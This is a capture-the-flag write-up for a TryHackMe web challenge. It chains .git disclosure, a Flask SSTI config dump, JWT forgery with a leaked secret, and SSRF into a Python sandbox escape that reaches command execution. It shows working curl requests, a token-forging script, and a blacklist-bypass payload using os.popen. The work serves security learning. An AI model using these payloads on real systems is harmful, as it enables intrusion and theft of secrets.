---
title: Love at First Breach — Chains of Love
date: 2026-02-20 00:00:00 +0530
categories:
  - TryHackMe
  - Love At First Breach
tags:
  - Love-At-First-Breach
  - web
---
- **Challenge:** Chains of Love
- **Category:** Web
- **Difficulty:** Hard
- **Target IP:** `10.48.151.212`
- **Tools Used:** nmap, gobuster, ffuf, curl, python3, PyJWT
- **Flag:** `THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Git Repository Disclosure](#3-git-repository-disclosure)
4. [Server-Side Template Injection (SSTI)](#4-server-side-template-injection-ssti)
5. [JWT Forgery → Admin Access](#5-jwt-forgery--admin-access)
6. [SSRF & Internal Service Discovery](#6-ssrf--internal-service-discovery)
7. [Python Sandbox Escape → RCE](#7-python-sandbox-escape--rce)

---

## 1. Reconnaissance

Starting off with a full nmap scan to see what we're working with.

```bash
$ nmap -sC -sV -T4 10.48.151.212
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-16 12:00 UTC
Nmap scan report for 10.48.151.212
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 xx:xx:xx:xx (ECDSA)
|_  256 xx:xx:xx:xx (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nova.thm/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports open — SSH and HTTP. The HTTP service is redirecting to `nova.thm`, so we add it to `/etc/hosts`:

```bash
$ echo "10.48.151.212 nova.thm" | sudo tee -a /etc/hosts
10.48.151.212 nova.thm
```

Visiting `http://nova.thm` in the browser reveals a corporate-looking website for **NovaDev Solutions** — a software development company. The site has standard pages: Home, About, Services, and a Contact form.

---

## 2. Web Enumeration

Time to dig deeper. Running gobuster to discover hidden paths:

```bash
$ gobuster dir -u http://nova.thm/ -w /usr/share/wordlists/dirb/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://nova.thm/
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Threads:                 50
[+] Status codes:            200,204,301,302,307,401,403
===============================================================
Starting gobuster
===============================================================
/.git/HEAD            (Status: 200) [Size: 23]
/about                (Status: 200) [Size: 3421]
/admin                (Status: 302) [Size: 199] [--> /admin/login]
/contact              (Status: 200) [Size: 2876]
/services             (Status: 200) [Size: 3102]
===============================================================
```

Two very interesting findings:

1. **`.git/HEAD`** — The entire `.git` directory is exposed! This means we can potentially dump the source code.
2. **`/admin`** — An admin panel that redirects to `/admin/login`.

Let's check the admin login page first:

```bash
$ curl -s http://nova.thm/admin/login
```

The login page HTML contains a juicy comment buried in the source:

```html
<!-- We recently moved to using JWTs -->
```

Good to know. They're using JSON Web Tokens for authentication. We'll come back to this.

---

## 3. Git Repository Disclosure

The `.git/HEAD` file is accessible, which means we can try to reconstruct the repository. Let's start pulling git objects:

```bash
$ curl -s http://nova.thm/.git/HEAD
ref: refs/heads/main

$ curl -s http://nova.thm/.git/refs/heads/main
a3f5e2d1c8b9f4a6e7d2c1b0a9f8e7d6c5b4a3f2

$ curl -s http://nova.thm/.git/logs/HEAD
```

The git log reveals multiple commits. We can extract commit objects by downloading them from `.git/objects/` and decompressing with zlib. I wrote a quick script to automate this, but the manual process looks like:

```bash
$ curl -s "http://nova.thm/.git/objects/a3/f5e2d1c8b9f4a6e7d2c1b0a9f8e7d6c5b4a3f2" | \
  python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))"
```

Walking the commit tree → tree objects → blob objects, we eventually recover a file called **`preview_feature.py`** from a previous commit. This appears to be the Flask source code for the contact form route:

```python
from flask import Flask, request, render_template, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route('/contact', methods=['POST'])
def contact():
    message = request.form.get('message', '')

    if message == "{{ config }}":
        # Quick debug check — remove before production!
        output = render_template_string(message, config=app.config)
        return output

    safe_message = escape(message)
    template = f"<p>Thank you for your message: {safe_message}</p>"
    return render_template_string(template)
```

This is a **Server-Side Template Injection (SSTI)** backdoor! If the message field is *exactly* `{{ config }}`, the app passes it directly to `render_template_string()` with the Flask config object — effectively dumping the entire application configuration including secrets.

The developer left a debug feature in production. Classic.

---

## 4. Server-Side Template Injection (SSTI)

Now that we know the exact payload required, let's trigger it:

```bash
$ curl -s -X POST http://nova.thm/contact -d 'message={{ config }}'
```

The response dumps the entire Flask configuration:

```
<Config {
  'DEBUG': False,
  'TESTING': False,
  'SECRET_KEY': 'cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565',
  'ADMIN_SECRET': 'cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565',
  ...
}>
```

We now have the **`ADMIN_SECRET`** (which is also the Flask `SECRET_KEY`):

```
cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565
```

This is the key used to sign JWT tokens. Since the admin panel uses JWTs (remember the HTML comment?), we can forge our own admin token.

---

## 5. JWT Forgery → Admin Access

Remember the hint from the login page: `<!-- We recently moved to using JWTs -->`. With the secret key in hand, we can craft a valid admin JWT:

```bash
$ python3 -c "
import jwt
token = jwt.encode(
    {'username': 'admin', 'role': 'admin'},
    'cc441eabd3ffb9fd211155ca37e1bdeff208f0a428d1913bb9e35759693de565',
    algorithm='HS256'
)
print(token)
"
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.aAzSzNrf8FlzS5aEy3K_cpzmZhr0vf3AEET2Il-zTak
```

Now we use this token as a cookie to access the admin dashboard:

```bash
$ curl -s http://nova.thm/admin \
  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.aAzSzNrf8FlzS5aEy3K_cpzmZhr0vf3AEET2Il-zTak'
```

We're in! The admin dashboard has a feature called **"Internal QA URL Fetch Tool"** — a server-side URL fetcher at `/admin/fetch?url=<target>`. This is a textbook **Server-Side Request Forgery (SSRF)** vector.

There's also a note on the page:

> "Digits are not allowed, we really like DNS!"

The tool blocks numeric characters in the URL parameter, meaning we can't use IP addresses directly (`127.0.0.1`, `http://localhost:9000`, etc.). We need to use DNS hostnames.

---

## 6. SSRF & Internal Service Discovery

The SSRF tool fetches URLs from the server side. Since digits are blocked, we need to discover internal hostnames. Let's fuzz for virtual hosts using ffuf:

```bash
$ ffuf -u http://nova.thm/ -H "Host: FUZZ.nova.thm" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fw 1  # filter by word count to remove default responses

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://nova.thm/
 :: Wordlist         : FUZZ: subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.nova.thm
 :: Follow redirects : false
________________________________________________

internal                [Status: 200, Size: 1842, Words: 312]
```

Found it — **`internal.nova.thm`**! Let's add it to hosts and use the SSRF to access it:

```bash
$ curl -s 'http://nova.thm/admin/fetch?url=http://internal.nova.thm' \
  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.aAzSzNrf8FlzS5aEy3K_cpzmZhr0vf3AEET2Il-zTak'
```

The response reveals an internal application: **NovaDev Python Sandbox** — a web-based Python code execution environment! It accepts Python expressions via a `code` GET parameter.

But there's a catch. The sandbox has a blacklist:

```
Blocked keywords: import, os, sys, dir, read, eval, exec, getattr, vars, subprocess, __ (double underscores)
```

This blocks virtually all the standard Python sandbox escape techniques. No `__import__`, no `__builtins__`, no `__class__.__mro__`, no `os.system`, no `eval()`... or so they think.

---

## 7. Python Sandbox Escape → RCE

The blacklist is extensive but not bulletproof. Let's approach this methodically.

**Step 1: Enumerate what's available**

The sandbox blocks `dir` and `__`, but `globals()` still works:

```bash
$ curl -s 'http://nova.thm/admin/fetch?url=http://internal.nova.thm?code=tuple(globals())' \
  -b 'token=...'
```

```
('__name__', '__doc__', '__package__', '__loader__', '__spec__',
 '__annotations__', '__builtins__', '__file__', '__cached__',
 'Flask', 'request', 'render_template_string', 'os', 'app',
 'SANDBOX_PAGE', 'sandbox')
```

The `os` module is right there in the global namespace! It was imported at the top of the internal app. It's just that the string `"os"` is blacklisted in the input — we can't *type* `os`, but the module object is already loaded.

**Step 2: Extract the `os` module without typing "os"**

We need to reference the `os` module object without using the string `os` anywhere in our code. The trick is to use `filter()` + `lambda` + `hasattr()` to identify the `os` module by its properties:

```python
# The os module has an 'environ' attribute — Flask, request, etc. don't
list(filter(lambda x: hasattr(x, 'environ'), globals().values()))
```

This filters all global values and returns only objects that have an `environ` attribute — which is uniquely the `os` module. Let's test:

```bash
$ curl -s 'http://nova.thm/admin/fetch?url=http://internal.nova.thm?code=type(list(filter(lambda%20x:hasattr(x,%27environ%27),globals().values())).pop())' \
  -b 'token=...'
```

```
<class 'module'>
```

We have a reference to the `os` module.

**Step 3: Achieve RCE**

Now we chain it with `os.popen()` to execute commands. But we can't call `.read()` on the result because `read` is blacklisted. Instead, we convert the file object directly to a `list()`:

```bash
$ curl -s 'http://nova.thm/admin/fetch?url=http://internal.nova.thm?code=list(list(filter(lambda%20x:hasattr(x,%27environ%27),globals().values())).pop().popen(%27cat%20flag.txt%27))' \
  -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.aAzSzNrf8FlzS5aEy3K_cpzmZhr0vf3AEET2Il-zTak'
```

```
['THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}\n']
```

there we go `THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}` that's our flag

---
## Attack Chain Summary

```
.git exposure → Source code leak (preview_feature.py)
       ↓
SSTI in /contact → Flask config dump (ADMIN_SECRET)
       ↓
JWT forgery → Admin dashboard access
       ↓
SSRF via URL Fetch Tool → Internal service discovery (internal.nova.thm)
       ↓
Python sandbox escape → RCE via os.popen()
       ↓
cat flag.txt → THM{s4ndb0x_3sc4p3d_w1th_RCE_l1k3_4_pr0}
```

The full exploit chain is a classic web CTF progression: information disclosure → injection → privilege escalation → SSRF to internal services → sandbox escape. The key insight at each stage was:

1. **Git disclosure** — Always check for `.git/` on web servers.
2. **SSTI** — The debug backdoor required the *exact* string `{{ config }}`, not a generic SSTI payload like `{{7*7}}`.
3. **JWT** — Once you have the signing secret, you own the auth.
4. **SSRF** — The digit filter was bypassed simply by using DNS hostnames.
5. **Sandbox escape** — The `os` module was already in `globals()`. Using `filter()` + `lambda` + `hasattr()` to grab it without typing any blacklisted words was the creative bypass. Wrapping `popen()` output in `list()` instead of calling `.read()` dodged the final filter.

---